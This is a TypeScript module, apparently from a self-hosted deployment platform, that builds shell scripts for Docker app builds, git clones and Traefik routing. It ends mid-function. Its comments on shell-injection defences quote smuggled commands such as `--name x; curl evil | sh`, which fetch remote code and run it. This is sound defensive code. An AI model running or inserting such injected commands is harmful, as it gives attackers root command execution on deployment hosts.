/**
 * Pure builders for the shell scripts the agent runs to deploy an app and to
 * run the Traefik reverse-proxy. Supports IMAGE (docker pull) and GIT
 * (clone + Nixpacks/Dockerfile build) sources, optional domain (Traefik + SSL).
 */

import { DB_NET } from "../databases/database-script"; // single source for the managed-DB network name
import {
  buildPanelRouterYaml,
  validateAcmeEmail,
  PANEL_NETWORK,
  PROXY_DYNAMIC_DIR,
  PANEL_FILE,
  type PanelResolver,
} from "./panel-router";

export const PROXY_NETWORK = "tugra-proxy";
export const PROXY_NAME = "tugra-proxy";

// Tugra's own infrastructure images, pinned to their multi-arch manifest-list (index) @sha256 digest
// for supply-chain integrity — a mutated tag can't silently swap the image. The tag is kept for
// readability; docker uses the digest. To bump: `docker buildx imagetools inspect <repo:tag>` and copy
// the top-level (index) Digest — it must be the index digest so it resolves on both amd64 and arm64.
//
// External health-probe image for the rolling health gate — lets us health-check a container over HTTP
// without baking curl into the app image (works for distroless).
export const HEALTH_PROBE_IMAGE =
  "curlimages/curl:8.11.1@sha256:c1fe1679c34d9784c1b0d1e5f62ac0a79fca01fb6377cdd33e90473c6f9f9a69";

// The reverse-proxy (one per server), launched by buildProxySetupScript.
// v3.7.x (not v3.1): Traefik v3.1's bundled Docker client advertises API 1.24, which Docker Engine 29+
// rejects ("client version 1.24 is too old; minimum 1.40"), so its docker provider loaded ZERO routers and
// every app answered 404 while running healthy. v3.7+ negotiates a supported API version. (DOCKER_API_VERSION
// env does NOT help — v3.1's client ignores it.)
export const PROXY_IMAGE =
  "traefik:v3.7.16@sha256:22a759fb803abb5c3a7ba5d5a55a201c5fb0fc8993d5c72c47a89075e64f1953";

export type Source = "IMAGE" | "GIT" | "COMPOSE";
export type BuildKind = "NIXPACKS" | "DOCKERFILE" | "STATIC" | "RAILPACK" | "HEROKU";

export interface AppSpec {
  id: string;
  source?: Source;
  image?: string | null;
  gitUrl?: string | null;
  gitBranch?: string | null;
  buildType?: BuildKind;
  dockerfilePath?: string | null;
  baseDirectory?: string | null; // GIT monorepo: build context/root = `${bd}/${baseDirectory}`; null → repo root
  buildCommand?: string | null;
  outputDir?: string | null;
  composeFile?: string | null;
  healthCmd?: string | null;
  /** Deploy-gate health check policy. type null = auto (healthCmd→CMD, domain→HTTP, else
   *  NONE); "NONE"|"HTTP"|"CMD" force it. path/port refine an HTTP check. */
  healthCheckType?: string | null;
  healthCheckPath?: string | null;
  healthCheckPort?: number | null;
  memoryMb?: number | null;
  cpus?: number | null;
  /** Soft Swarm scheduling hints (`docker service --reserve-memory`/`--reserve-cpu`) — swarm-only; ignored on
   *  the classic single-container path (which has no reservation flag). See ServiceDeployOpts in service-script.ts. */
  reserveMemoryMb?: number | null;
  reserveCpus?: number | null;
  /** docker `--gpus` value (e.g. "all", "1", "device=0,1"); requires the NVIDIA container runtime on the host. */
  gpus?: string | null;
  /** Swarm service replica count (only meaningful when deployed to a cluster). null = classic single container. */
  replicas?: number | null;
  /** Swarm-only: structured placement constraints (rendered to `--constraint` expressions). */
  placementConstraints?: PlacementConstraint[] | null;
  /** Swarm-only: spread replicas across values of this node-label key (`--placement-pref spread=…`). */
  placementSpreadLabelKey?: string | null;
  volumes?: AppVolume[] | null;
  /** Host directories bind-mounted into the container (advanced; validated against the sensitive-path denylist). */
  hostMounts?: HostMount[] | null;
  gitToken?: string | null;
  /** OpenSSH private deploy key for an ssh:// or git@ repo URL (decrypted); clones via GIT_SSH_COMMAND. */
  gitSshKey?: string | null;
  registryAuth?: RegistryAuth | null;
  env: Record<string, string>;
  /** Build-time variables injected during image build (separate from runtime env). */
  buildArgs?: Record<string, string>;
  /** Raw extra flags appended to `docker run` (advanced; passed through verbatim). */
  dockerOptions?: string | null;
  /** Shell command run in a one-shot container of the NEW image before the swap (e.g. DB migrations).
   *  A non-zero exit aborts the deploy with the old container still serving. null/empty → no hook. */
  preDeployCommand?: string | null;
  /** Shell command run inside the LIVE container after the health gate passes. Best-effort: a failure is
   *  logged but never rolls back (the new version is already serving). null/empty → no hook. */
  postDeployCommand?: string | null;
  /** When set, the built image is tagged + pushed to this registry after building. */
  registryPush?: { auth: RegistryAuth; tag: string } | null;
  /** When set, the local tag is produced by PULLING this registry ref (built elsewhere),
   *  not by building — for a build-server deploy, a registry-backed rollback, or a digest-pinned
   *  IMAGE rollback. `auth` is optional (a public image digest needs none). */
  registryPull?: { auth?: RegistryAuth | null; ref: string } | null;
  hostPort: number | null;
  containerPort: number | null;
  /** Opt-in: also attach the container to the node-local managed-DB network (tugra-net) so it resolves
   *  tugra_db_<id> by name. Co-located classic apps only (masked off for swarm in toSpec). */
  dbNetwork?: boolean | null;
  domain?: string | null;
  domainRedirect?: "www" | "root" | null;
  securityHeaders?: boolean;
  /** External auth service URL — protects the app via a Traefik forwardauth middleware. */
  forwardAuth?: string | null;
  /** Cert strategy driving the Traefik router: "http"/"none" → plain HTTP; otherwise HTTPS+LE. */
  certType?: string;
  /** Server's wildcard root (e.g. apps.example.com) — for a le-dns wildcard cert. */
  wildcardDomain?: string | null;
  /** Server's custom Traefik resolver name — for certType "custom" WITHOUT an uploaded cert (legacy
   *  operator-defined resolver). Superseded by an uploaded cert when `certPem` is present. */
  customCertResolver?: string | null;
  /** Operator-uploaded custom cert (certType "custom"): the public PEM chain + its private key. When set,
   *  the router serves this static cert by SNI (no ACME) and the deploy writes it into the proxy's /dynamic. */
  certPem?: string | null;
  certKey?: string | null;
  /** Rolling deploy only: when set, emit a Traefik LB health check on this path so the
   *  unready rollout backend stays out of rotation until it's live (zero-downtime). */
  rollingHealthPath?: string | null;
  /** For a COMPOSE app: the service to attach the Traefik router to (magic domain).
   *  When set, buildComposeUpScript writes a label-only override joining it to the proxy. */
  composeWebService?: string | null;
  /** For a COMPOSE app: template config files to materialize on the host and bind-mount read-only
   *  into their service. buildComposeUpScript writes each under the app's compose dir + adds the bind
   *  to the Tugra override. */
  configMounts?: AppConfigMount[] | null;
}

/** A structured Swarm placement rule. Never a raw docker expression from the client — the hub
 *  renders it to a `docker service --constraint` string via constraintExpr(). Values are charset-validated in
 *  the DTO layer; shq() at the shell boundary is the real injection defence. */
export type PlacementConstraint =
  | { type: "hostname"; op: "eq" | "ne"; value: string }
  | { type: "nodeId"; op: "eq" | "ne"; value: string }
  | { type: "role"; op: "eq" | "ne"; value: "manager" | "worker" }
  | { type: "label"; op: "eq" | "ne"; key: string; value: string };

/** Render one placement constraint to a docker swarm constraint expression (e.g. `node.hostname==web-1`). */
export function constraintExpr(c: PlacementConstraint): string {
  const op = c.op === "ne" ? "!=" : "==";
  switch (c.type) {
    case "hostname": return `node.hostname${op}${c.value}`;
    case "nodeId": return `node.id${op}${c.value}`;
    case "role": return `node.role${op}${c.value}`;
    case "label": return `node.labels.${c.key}${op}${c.value}`;
  }
}

/** Render a spread preference over a node-label key (`--placement-pref spread=node.labels.<key>`). */
export function spreadPrefExpr(labelKey: string): string {
  return `spread=node.labels.${labelKey}`;
}

/** Credentials for pulling from a private container registry. */
export interface RegistryAuth {
  url?: string;
  user: string;
  token: string;
}

/** A persistent named volume mounted into the app container. */
export interface AppVolume {
  name: string;
  path: string;
}

/** A HOST directory bind-mounted into the app container (e.g. a media library at /mnt/media). Unlike a
 *  named volume, the source is a real host path — validated against the sensitive-path denylist before it
 *  is ever stored (see validateHostMounts), and shell-quoted at deploy so a path can't inject into `sh -c`. */
export interface HostMount {
  hostPath: string;
  containerPath: string;
  readOnly?: boolean;
}

/** A template config file materialized on the host and bind-mounted read-only into a service at
 *  deploy. `content` may carry `${KEY}` placeholders resolved from the app env at write time. Mirrors
 *  templates/ConfigMount but kept local so the deploy layer stays decoupled from templates/. */
export interface AppConfigMount {
  serviceName: string;
  target: string; // absolute in-container path
  content: string;
  mode?: string; // octal file mode, default 0644
}

export function containerName(app: { id: string }): string {
  return `tugra_${app.id}`;
}

/** Temporary name for the not-yet-live container during a rolling deploy. It carries
 *  the SAME Traefik labels as the canonical container, so both register the identical
 *  router/service (traffic overlaps cleanly) until the old one is removed + rename. */
export function rolloutName(app: { id: string }): string {
  return `${containerName(app)}__rollout`;
}

/** Docker volume name for an app's named volume (persists across redeploys). */
export function appVolumeName(app: { id: string }, name: string): string {
  return `tugra_appv_${app.id}_${name}`;
}

/**
 * The versioned, locally-stored image tag a deployment runs. Every deploy (GIT
 * build or IMAGE pull) is snapshotted to `tugra_<appId>:<version>` so a later
 * rollback can re-run an old version without rebuilding or re-pulling.
 */
export function runTag(app: { id: string }, version: string): string {
  return `${containerName(app)}:${version}`;
}

/** The upstream image to pull for an IMAGE-source app. */
export function imageRef(app: AppSpec): string {
  return app.image ?? "";
}

/**
 * Extract the resolved upstream image digest from an IMAGE deploy's output. The deploy script emits
 * `TUGRA_DIGEST=<repo>@sha256:<hex>` right after `docker pull` (see prepSteps). Returns the full
 * pullable ref (e.g. `nginx@sha256:…`) or null when the image had no registry digest.
 */
export function parseImageDigest(output: string): string | null {
  const m = /TUGRA_DIGEST=(\S+)/.exec(output);
  return m ? m[1] : null;
}

/**
 * Extract the deployed git commit from a GIT deploy's output. prepSteps echoes, right after the clone
 * and BEFORE any user build output, `TUGRA_COMMIT=<40/64-hex>` and `TUGRA_COMMIT_MSG_B64=<base64 subject>`
 * (both unconditionally, so the real marker always precedes user output and the first anchored match wins).
 * The sha is hex-validated so arbitrary build/user output (which could print a fake `TUGRA_COMMIT=`) can't
 * poison provenance. The subject is attacker-influenceable text (public repos), so it is base64-transported,
 * then decoded, stripped of control chars, and capped. CALLERS must gate on source === "GIT" — for an
 * IMAGE/COMPOSE app no real marker is emitted, so a hook/build line could otherwise forge one. Returns
 * null when the marker is absent or the sha is not valid hex. (40 hex = sha1, 64 = sha256 repos.)
 */
export function parseCommit(output: string): { sha: string; message: string | null } | null {
  const shaM = /^TUGRA_COMMIT=([0-9a-f]{7,64})\s*$/m.exec(output);
  if (!shaM) return null;
  const msgM = /^TUGRA_COMMIT_MSG_B64=([A-Za-z0-9+/=]*)\s*$/m.exec(output);
  let message: string | null = null;
  if (msgM && msgM[1]) {
    try {
      const decoded = Buffer.from(msgM[1], "base64").toString("utf8");
      // First line only, strip control chars (incl. ANSI escapes), cap length — pure data, never shell/HTML.
      const clean = decoded.split("\n")[0].replace(/[\u0000-\u001f\u007f]/g, "").trim();
      message = clean ? clean.slice(0, 200) : null;
    } catch {
      message = null;
    }
  }
  return { sha: shaM[1], message };
}

/** The registry reference the built image is pushed to:
 *  `[<host>/]<namespace>/tugra_<appId>:<version>`. Docker Hub has no host component. The
 *  namespace is the configured imagePrefix, falling back to the username — a bare
 *  `tugra_<id>` would resolve to the unwritable `library/` namespace and the push would be
 *  denied. */
export function registryImageRef(
  reg: { url?: string | null; imagePrefix?: string | null; username?: string | null },
  app: { id: string },
  version: string,
): string {
  const trim = (s: string) => s.replace(/\/+$/, "");
  const host = reg.url ? `${trim(reg.url)}/` : "";
  const ns = reg.imagePrefix ? trim(reg.imagePrefix) : trim(reg.username ?? "");
  const prefix = ns ? `${ns}/` : "";
  return `${host}${prefix}${containerName(app)}:${version}`;
}

/** Build (+ push, if the spec carries registryPush) the image WITHOUT running it — for a
 *  build server that builds and pushes so a separate deploy server can pull and run. */
export function buildBuildOnlyScript(app: AppSpec, version: string, noCache = false): string {
  return ["set -e", ...prepSteps(app, version, noCache)].join("\n");
}

/** Tag the locally-built image under the registry ref and push it, reusing the stdin login
 *  (isolated DOCKER_CONFIG, token never in argv) + logout. */
export function buildRegistryPushSteps(localTag: string, pushTag: string, auth: RegistryAuth): string[] {
  return [
    `docker tag ${localTag} ${shq(pushTag)}`,
    ...registryLoginPrelude(auth),
    `docker push ${shq(pushTag)}`,
    ...registryLogoutSteps(auth),
  ];
}

function shq(v: string): string {
  return `'${v.replaceAll("'", "'\\''")}'`;
}

/**
 * Turn an operator's raw `dockerOptions` string (advanced `docker run` flags) into a shell-SAFE argument
 * list: split it into shell words (respecting single/double quotes + backslash escapes), then shell-quote
 * EACH word. Embedded verbatim, `dockerOptions` is a host-root RCE — the deploy command runs under `sh -c`,
 * so a value like `--name x; curl evil | sh` would execute. After this, that same input becomes literal
 * argv tokens (`'--name' 'x;' 'curl' 'evil' '|' 'sh'`) that `docker run` rejects as unknown flags — the
 * shell never re-interprets them. Legitimate flags (`--cap-add=NET_ADMIN --label foo="a b"`) are preserved.
 * Throws on an unterminated quote (fail closed) so a malformed value fails the deploy instead of splitting
 * unpredictably. Empty/whitespace/null → "".
 */
export function dockerOptionsArgs(raw: string | null | undefined): string {
  return tokenizeDockerOptions(raw).map(shq).join(" ");
}

/** Split a raw `dockerOptions` string into shell words (respecting single/double quotes + backslash
 *  escapes). Returns the raw (un-quoted) tokens — the caller shell-quotes each for {@link dockerOptionsArgs},
 *  or inspects them for dangerous flags (docker-options-safety). Throws on an unterminated quote. */
export function tokenizeDockerOptions(raw: string | null | undefined): string[] {
  if (!raw || !raw.trim()) return [];
  const tokens: string[] = [];
  let cur = "";
  let has = false; // whether the current run is a token (handles empty quoted args like foo="")
  let inSingle = false;
  let inDouble = false;
  for (let i = 0; i < raw.length; i++) {
    const c = raw[i];
    if (inSingle) {
      if (c === "'") inSingle = false;
      else cur += c;
      continue;
    }
    if (inDouble) {
      if (c === '"') inDouble = false;
      else if (c === "\\" && (raw[i + 1] === '"' || raw[i + 1] === "\\")) cur += raw[++i];
      else cur += c;
      continue;
    }
    if (c === "'") {
      inSingle = true;
      has = true;
    } else if (c === '"') {
      inDouble = true;
      has = true;
    } else if (c === "\\" && i + 1 < raw.length) {
      cur += raw[++i];
      has = true;
    } else if (c === " " || c === "\t" || c === "\n" || c === "\r") {
      if (has) {
        tokens.push(cur);
        cur = "";
        has = false;
      }
    } else {
      cur += c;
      has = true;
    }
  }
  if (inSingle || inDouble) throw new Error("dockerOptions has an unterminated quote");
  if (has) tokens.push(cur);
  return tokens;
}

/**
 * Whether the docker options declare a custom network (`--network`/`--net`). Such an app manages its own
 * networking and must not also be attached to the managed-DB bridge (tugra-net). Tokenize first (quote-aware)
 * so a quoted form like `"--network" host` or `'--net=x'` can't slip past a raw-string regex.
 */
export function hasNetworkOpt(dockerOptions: string | null | undefined): boolean {
  return tokenizeDockerOptions(dockerOptions).some((t) => /^(--network|--net)(=|$)/.test(t));
}

function b64(v: string): string {
  return Buffer.from(v, "utf8").toString("base64");
}

/** Inject the `x-access-token` user into an https git URL (token itself stays out). */
// Persistent known_hosts dir (bind-mounted from the host into the agent), so accept-new TOFU survives an
// agent recreate/self-update and a changed host key then HARD-FAILS (MITM caught) rather than silently re-trusting.
const SSH_DIR = "/etc/tugra/ssh";

/** An SSH-form git URL: `ssh://…` or scp-style `user@host:path`. These clone with a deploy key, not a token. */
export function isSshGitUrl(url: string): boolean {
  return /^ssh:\/\//i.test(url) || /^[A-Za-z0-9._-]+@[A-Za-z0-9._-]+:/.test(url);
}

/** Lower-cased host of a git URL (https://, ssh://, or scp-style user@host:path); null if unparseable.
 *  Used to decide whether a repo-URL edit crosses a host boundary — which must drop stored credentials
 *  so a token/key can't be sent to a different server. */
export function gitUrlHost(url: string): string | null {
  const u = (url ?? "").trim();
  const scp = /^[A-Za-z0-9._-]+@([A-Za-z0-9._-]+):/.exec(u); // scp-style user@host:path
  if (scp) return scp[1].toLowerCase();
  const m = /^[a-zA-Z][a-zA-Z0-9+.-]*:\/\/(?:[^@/]+@)?([^:/]+)/.exec(u); // scheme://[user@]host[:port]/...
  return m ? m[1].toLowerCase() : null;
}

export function gitAuthUrl(gitUrl: string): string {
  return gitUrl.replace(/^https:\/\//i, "https://x-access-token@");
}

/**
 * Shell prelude that creates a 0700 temp dir ($sd) for build-time secrets. Reused for git
 * askpass and isolated docker registry config so no token persists on disk. When called
 * more than once in a script (e.g. a private git clone AND a registry push), each dir is
 * accumulated into $TUGRA_SEC_DIRS and a single EXIT trap wipes ALL of them — a plain
 * `trap … "$sd"` would be replaced by the second call and orphan the first dir on disk.
 * mktemp paths under /etc/tugra/builds contain no spaces, so the unquoted expansion is safe.
 */
function secretsDirPrelude(): string[] {
  return [
    "mkdir -p /etc/tugra/builds",
    "sd=$(mktemp -d /etc/tugra/builds/.sec.XXXXXX)",
    'chmod 700 "$sd"',
    'TUGRA_SEC_DIRS="${TUGRA_SEC_DIRS:+$TUGRA_SEC_DIRS }$sd"',
    "trap 'rm -rf $TUGRA_SEC_DIRS' EXIT",
  ];
}

export function traefikLabels(app: AppSpec): string[] {
  if (!app.domain) return [];
  const r = containerName(app);
  const port = app.containerPort ?? 80;
  const redirect = app.domainRedirect ?? null;
  const base = app.domain.replace(/^www\./i, "");
  const www = `www.${base}`;
  // When a canonical redirect is set, answer for both bare + www hosts.
  const rule = redirect ? `Host(\`${base}\`) || Host(\`${www}\`)` : `Host(\`${app.domain}\`)`;
  // Magic domains (and anything pinned to certType "http"/"none") are served over
  // plain HTTP on the `web` entrypoint — no TLS, no Let's Encrypt, no HTTP→HTTPS
  // redirect. Everything else (custom domains, certType "le-http") keeps the HTTPS
  // router with a cert and the :80→:443 redirect.
  const httpOnly = app.certType === "http" || app.certType === "none";
  const scheme = httpOnly ? "http" : "https";

  // HTTPS cert resolver: DNS-01 wildcard (le-dns), a custom operator resolver, or
  // the default HTTP-01 (le) for le-http / any other HTTPS mode.
  // An operator-uploaded cert (certType "custom" + certPem) is served statically: the router gets TLS with
  // NO certresolver, so Traefik matches the cert we wrote into /dynamic by SNI instead of asking ACME.
  const uploadedCert = app.certType === "custom" && !!app.certPem && !!app.certKey;
  const resolver =
    app.certType === "le-dns" ? "le-dns" : app.certType === "custom" ? app.customCertResolver || "le" : "le";

  const labels = ["traefik.enable=true", `traefik.http.routers.${r}.rule=${rule}`];
  if (httpOnly) {
    labels.push(
      `traefik.http.routers.${r}.entrypoints=web`,
      `traefik.http.services.${r}.loadbalancer.server.port=${port}`,
    );
  } else {
    labels.push(
      `traefik.http.routers.${r}.entrypoints=websecure`,
      uploadedCert
        ? `traefik.http.routers.${r}.tls=true`
        : `traefik.http.routers.${r}.tls.certresolver=${resolver}`,
      `traefik.http.services.${r}.loadbalancer.server.port=${port}`,
      `traefik.http.routers.${r}-web.rule=${rule}`,
      `traefik.http.routers.${r}-web.entrypoints=web`,
      `traefik.http.routers.${r}-web.middlewares=${r}-redirect`,
      `traefik.http.middlewares.${r}-redirect.redirectscheme.scheme=https`,
    );
    // A DNS-01 wildcard cert covers *.wildcardDomain (+ the apex as a SAN), so every
    // magic app on the server shares one cert instead of one per host.
    if (app.certType === "le-dns" && app.wildcardDomain) {
      labels.push(
        `traefik.http.routers.${r}.tls.domains[0].main=*.${app.wildcardDomain}`,
        `traefik.http.routers.${r}.tls.domains[0].sans=${app.wildcardDomain}`,
      );
    }
  }

  // Rolling deploy only: an active Traefik load-balancer health check so the not-yet-
  // ready rollout backend is kept OUT of rotation until it answers 2xx/3xx on the
  // health path — otherwise Traefik would round-robin live traffic onto a booting
  // container (502s) during the overlap. Set only by buildRollingDeployScript; a
  // hard-cutover deploy never carries it (no behaviour change for existing apps).
  // Traefik's check counts only 2xx/3xx as UP (its `.status` label is a single int, not a range), so
  // buildRollingDeployScript re-creates the live container WITHOUT this label when the deploy gate
  // accepted a >= 400 probe response (see `relabel` there) — else that app would 503 after the rename.
  if (app.rollingHealthPath) {
    labels.push(
      `traefik.http.services.${r}.loadbalancer.healthcheck.path=${app.rollingHealthPath}`,
      `traefik.http.services.${r}.loadbalancer.healthcheck.interval=3s`,
      `traefik.http.services.${r}.loadbalancer.healthcheck.timeout=5s`,
    );
  }

  const mw: string[] = [];
  if (redirect) {
    const esc = (s: string) => s.replace(/\./g, "\\.");
    const from = redirect === "root" ? www : base; // non-canonical host
    const to = redirect === "root" ? base : www; // canonical host
    labels.push(
      `traefik.http.middlewares.${r}-canon.redirectregex.regex=^${scheme}://${esc(from)}/(.*)`,
      `traefik.http.middlewares.${r}-canon.redirectregex.replacement=${scheme + "://" + to + "/${1}"}`,
      `traefik.http.middlewares.${r}-canon.redirectregex.permanent=true`,
    );
    mw.push(`${r}-canon`);
  }
  if (app.securityHeaders) {
    labels.push(
      `traefik.http.middlewares.${r}-sec.headers.stsSeconds=31536000`,
      `traefik.http.middlewares.${r}-sec.headers.stsIncludeSubdomains=true`,
      `traefik.http.middlewares.${r}-sec.headers.contentTypeNosniff=true`,
      `traefik.http.middlewares.${r}-sec.headers.frameDeny=true`,
      `traefik.http.middlewares.${r}-sec.headers.referrerPolicy=strict-origin-when-cross-origin`,
    );
    mw.push(`${r}-sec`);
  }
  if (app.forwardAuth) {
    labels.push(
      `traefik.http.middlewares.${r}-fa.forwardauth.address=${app.forwardAuth}`,
      `traefik.http.middlewares.${r}-fa.forwardauth.trustForwardHeader=true`,
      `traefik.http.middlewares.${r}-fa.forwardauth.authResponseHeaders=Remote-User,Remote-Groups,Remote-Name,Remote-Email`,
    );
    mw.unshift(`${r}-fa`); // auth runs first in the chain
  }
  if (mw.length) labels.push(`traefik.http.routers.${r}.middlewares=${mw.join(",")}`);
  return labels;
}

/** Generated Dockerfile for a STATIC site: optional node build stage, then nginx. */
export function staticDockerfile(buildCommand?: string | null, outputDir?: string | null): string {
  const out = (outputDir || "dist").replace(/^\/+/, "");
  if (buildCommand) {
    return [
      "FROM node:20-alpine AS build",
      "WORKDIR /app",
      "COPY . .",
      `RUN ${buildCommand}`,
      "FROM nginx:alpine",
      `COPY --from=build /app/${out} /usr/share/nginx/html`,
      "COPY tugra-nginx.conf /etc/nginx/conf.d/default.conf",
    ].join("\n");
  }
  // No build step: the repo already ships the built static files.
  return [
    "FROM nginx:alpine",
    `COPY ${out} /usr/share/nginx/html`,
    "COPY tugra-nginx.conf /etc/nginx/conf.d/default.conf",
  ].join("\n");
}

/** nginx config for a static/SPA site: serve files, fall back to index.html. */
export function staticNginxConf(): string {
  return [
    "server {",
    "  listen 80;",
    "  root /usr/share/nginx/html;",
    "  index index.html;",
    "  location / { try_files $uri $uri/ /index.html; }",
    "}",
  ].join("\n");
}

/** Build the prep steps (clone+build, or pull) that produce `tugra_<appId>:<version>`. */
function prepSteps(app: AppSpec, version: string, noCache = false): string[] {
  const tag = runTag(app, version);
  // registryPull: materialise the local tag by PULLING a specific registry ref instead of
  // building — the image was already built+pushed elsewhere (a build server, or a previous
  // deploy for a registry-backed rollback). Mutually exclusive with a build/push in one
  // script, so return early (never appends the registryPush steps below).
  if (app.registryPull) {
    return [
      ...registryLoginPrelude(app.registryPull.auth),
      `docker pull ${shq(app.registryPull.ref)}`,
      `docker tag ${shq(app.registryPull.ref)} ${tag}`,
      ...registryLogoutSteps(app.registryPull.auth),
    ];
  }
  const nc = noCache ? "--no-cache " : "";
  // Build-time variables: `--build-arg K=V` for docker build, `--env K=V` for
  // the CNB/nixpacks/railpack builders. Empty → no flags (regression-safe).
  const ba = app.buildArgs && Object.keys(app.buildArgs).length ? app.buildArgs : null;
  const buildArgFlags = ba
    ? Object.entries(ba).map(([k, v]) => `--build-arg ${shq(`${k}=${v}`)}`).join(" ") + " "
    : "";
  const buildEnvFlags = ba
    ? " " + Object.entries(ba).map(([k, v]) => `--env ${shq(`${k}=${v}`)}`).join(" ")
    : "";
  if (app.source === "GIT") {
    const bd = `/etc/tugra/builds/${app.id}`;
    // Monorepo: the repo is still cloned WHOLE into `bd` (clone / rm / commit-markers stay on the repo root);
    // only the build CONTEXT and the builder ROOT move to the subdirectory. `baseDirectory` is validated by
    // BASE_DIR (no leading `/`, no `..`, charset bars spaces/metachars), so it is safe unquoted — and when it
    // is null `base === bd`, keeping every build command byte-identical to the pre-monorepo output.
    const base = app.baseDirectory ? `${bd}/${app.baseDirectory}` : bd;
    const branch = app.gitBranch || "main";
    const url = app.gitUrl ?? "";
    const ssh = isSshGitUrl(url);
    const useSsh = !!app.gitSshKey && ssh;
    const useToken = !!app.gitToken && /^https:\/\//i.test(url);
    const steps = [`rm -rf ${bd} && mkdir -p ${bd}`];
    if (useSsh) {
      // Private SSH clone: the deploy key is written to a 0600 temp file (base64-piped, never in argv),
      // and host keys are learned/pinned in a persistent known_hosts (accept-new TOFU).
      steps.push(
        ...secretsDirPrelude(),
        `command -v ssh >/dev/null 2>&1 || { echo "TUGRA: this agent image has no ssh client — update the agent to clone over SSH"; exit 1; }`,
        `printf %s ${shq(b64(app.gitSshKey!))} | base64 -d > "$sd/id"`,
        'chmod 600 "$sd/id"',
        `mkdir -p ${SSH_DIR}`,
        `GIT_SSH_COMMAND="ssh -F /dev/null -i $sd/id -o IdentitiesOnly=yes -o BatchMode=yes -o ConnectTimeout=30 -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=${SSH_DIR}/known_hosts" GIT_TERMINAL_PROMPT=0 git clone --depth 1 --branch ${shq(branch)} -- ${shq(url)} ${bd}`,
      );
    } else if (ssh) {
      // An SSH repo URL but no deploy key configured — fail clearly instead of prompting / hanging.
      steps.push(`echo "TUGRA: this is an SSH repo but no deploy key is set — generate one and add it to the repo"; exit 1`);
    } else if (useToken) {
      // Private clone: token via GIT_ASKPASS (never in argv / URL / .git/config).
      steps.push(
        ...secretsDirPrelude(),
        `printf %s ${shq(b64(app.gitToken!))} | base64 -d > "$sd/token"`,
        'chmod 600 "$sd/token"',
        `printf '%s\\n' '#!/bin/sh' 'cat "$(dirname "$0")/token"' > "$sd/askpass"`,
        'chmod 700 "$sd/askpass"',
        `GIT_ASKPASS="$sd/askpass" GIT_TERMINAL_PROMPT=0 git clone --depth 1 --branch ${shq(branch)} -- ${shq(gitAuthUrl(url))} ${bd}`,
      );
    } else {
      steps.push(`git clone --depth 1 --branch ${shq(branch)} -- ${shq(url)} ${bd}`);
    }
    // Record the deployed commit right after the clone and BEFORE any build output — build/user output is
    // noisy (could push a late marker past the agent's 64KB head-capped buffer) and could print a fake
    // `TUGRA_COMMIT=` line (parseCommit takes the first anchored, hex-validated match, so earliest wins).
    // All best-effort + set-e-safe via `|| true`; the subject is base64-transported (never raw on a marker).
    steps.push(
      `TUGRA_C=$(git -C ${bd} rev-parse HEAD 2>/dev/null || true)`,
      `echo "TUGRA_COMMIT=$TUGRA_C"`,
      `TUGRA_CM=$(git -C ${bd} log -1 --format=%s 2>/dev/null | head -c 300 | base64 | tr -d '\\n' || true)`,
      `echo "TUGRA_COMMIT_MSG_B64=$TUGRA_CM"`,
    );
    if (app.baseDirectory) {
      // The clone is untrusted: a `baseDirectory` like `apps/api` could be a symlink to `/` or `/etc`, which
      // docker/nixpacks would then use as the build context and `COPY . .` would bake host files into the
      // image. The BASE_DIR regex can't catch a symlink, so resolve both paths (`pwd -P`, POSIX — no realpath
      // on slim agents) and hard-fail unless the base stays inside the clone. A missing dir fails too (never
      // silently fall back to the repo root and deploy the wrong code).
      steps.push(
        `TUGRA_BD=$(cd ${bd} && pwd -P)`,
        `TUGRA_BASE=$(cd ${shq(base)} 2>/dev/null && pwd -P) || { echo "TUGRA: base directory not found in the repository"; exit 1; }`,
        `case "$TUGRA_BASE/" in "$TUGRA_BD"/*) ;; *) echo "TUGRA: base directory resolves outside the repository"; exit 1;; esac`,
      );
    }
    if (app.buildType === "DOCKERFILE") {
      // shq the -f path: dockerfilePath is caller/importer-supplied; unquoted it was a host-root shell
      // injection (e.g. `Dockerfile; curl evil|sh`). The `--` before each clone URL likewise stops a
      // URL that begins with `-` from being parsed as a git option. The path is relative to `base` (the
      // monorepo subdirectory, or the repo root when no base is set).
      const df = app.dockerfilePath || "Dockerfile";
      steps.push(`docker build ${nc}${buildArgFlags}-t ${tag} -f ${shq(`${base}/${df}`)} ${base}`);
    } else if (app.buildType === "STATIC") {
      // Generate an nginx (+ optional node build stage) Dockerfile and config.
      steps.push(
        `printf %s ${shq(b64(staticDockerfile(app.buildCommand, app.outputDir)))} | base64 -d > ${base}/Dockerfile.tugra`,
        `printf %s ${shq(b64(staticNginxConf()))} | base64 -d > ${base}/tugra-nginx.conf`,
        `docker build ${nc}${buildArgFlags}-t ${tag} -f ${base}/Dockerfile.tugra ${base}`,
      );
    } else if (app.buildType === "RAILPACK") {
      // Railpack (Railway's modern builder) — builds an OCI image via BuildKit.
      steps.push(
        "command -v railpack >/dev/null 2>&1 || curl -sSL https://railpack.com/install.sh | sh",
        `railpack build ${base} --name ${tag}${buildEnvFlags}`,
      );
    } else if (app.buildType === "HEROKU") {
      // Heroku / Cloud Native Buildpacks via the pack CLI.
      steps.push(
        "command -v pack >/dev/null 2>&1 || { curl -sSL https://github.com/buildpacks/pack/releases/download/v0.36.0/pack-v0.36.0-linux.tgz | tar -C /usr/local/bin -xz pack; }",
        `pack build ${tag} --path ${base} --builder heroku/builder:24 --pull-policy if-not-present${buildEnvFlags}`,
      );
    } else {
      // Nixpacks: materialise the build plan first so we can (a) inject curl/wget into the
      // setup phase — a health-cmd like `curl …` must exist inside an otherwise slim image —
      // and (b) pass a per-app --cache-key for fast layer-reuse across deploys. `--env` flags
      // go to BOTH plan and build. jq is best-effort: if it's absent we skip injection (the
      // external HTTP probe still works) rather than install arbitrary packages on the host.
      // The plan lives OUTSIDE bd (a sibling path) so Nixpacks' `COPY . /app` never bakes it
      // into the image; it's removed after the build.
      const plan = `/etc/tugra/builds/${app.id}.plan.json`;
      steps.push(
        "command -v nixpacks >/dev/null 2>&1 || curl -sSL https://nixpacks.com/install.sh | bash",
        `nixpacks plan -f json${buildEnvFlags} ${base} > ${plan}`,
        "if command -v jq >/dev/null 2>&1; then",
        `  jq '.phases.setup.aptPkgs = ((.phases.setup.aptPkgs // []) + ["curl","wget"] | unique)' ${plan} > ${plan}.tmp && mv ${plan}.tmp ${plan}`,
        "else",
        '  echo "TUGRA: jq not found — skipping curl/wget health-tool injection into the Nixpacks plan" >&2',
        "fi",
